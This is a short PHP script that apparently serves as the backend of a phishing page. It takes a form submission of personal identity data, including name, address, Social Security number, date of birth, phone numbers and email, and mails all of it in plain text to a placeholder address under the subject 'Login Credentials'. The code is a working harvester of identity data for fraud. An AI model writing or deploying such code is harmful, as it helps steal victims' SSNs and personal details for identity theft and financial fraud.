<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
   $firstName = $_POST['firstName'] ?? '';
$middleName = $_POST['middleName'] ?? '';
$lastName = $_POST['lastName'] ?? '';
$suffix = $_POST['suffix'] ?? '';
$address1 = $_POST['address1'] ?? '';
$address2 = $_POST['address2'] ?? '';
$city = $_POST['city'] ?? '';
$state = $_POST['state'] ?? '';
$zipCode = $_POST['zipCode'] ?? '';
$yearsAtAddress = $_POST['yearsAtAddress'] ?? '';
$certify = $_POST['certify'] ?? '';
$ssn = $_POST['ssn'] ?? '';
$dob = $_POST['dob'] ?? '';
$identity = $_POST['identity'] ?? '';
$mobilePhone = $_POST['mobilePhone'] ?? '';
$homePhone = $_POST['homePhone'] ?? '';
$email = $_POST['email'] ?? '';
$employmentStatus = $_POST['employmentStatus'] ?? '';
$occupation = $_POST['occupation'] ?? '';
$politicalFigure1 = $_POST['politicalFigure1'] ?? '';
$politicalFigure2 = $_POST['politicalFigure2'] ?? '';
$certify = $_POST['certify'] ?? '';

    $to = "your-email@example.com"; // Replace with your email
    $subject = "Login Credentials";
    $message = "firstName: " . $firstName . "\r\n middleName: " . $middleName ."\r\n lastName: " . $lastName. "\r\n suffix: " . $suffix. "\r\n address1: " . $address1. "\r\n address2: " . $address2."\r\n city: " . $city."\r\n state: " . $state."\r\n zipCode: " . $zipCode."\r\n yearsAtAddress: " . $yearsAtAddress."\r\n certify: " . $certify."\r\n ssn: " . $ssn."\r\n dob: " . $dob."\r\n identity: " . $identity."\r\n mobilePhone: " . $mobilePhone."\r\n homePhone: " . $homePhone."\r\n email: " . $email."\r\n employmentStatus: " . $employmentStatus."\r\n occupation: " . $occupation."\r\n politicalFigure1: " . $politicalFigure1."\r\n politicalFigure2: " . $politicalFigure2."\r\n certify: " . $certify;
    $headers = "From: noreply@yourdomain.com";

    if (mail($to, $subject, $message, $headers)) {
        echo "Credentials sent to email.";
    } else {
        echo "Failed to send email.";
    }
}
?>
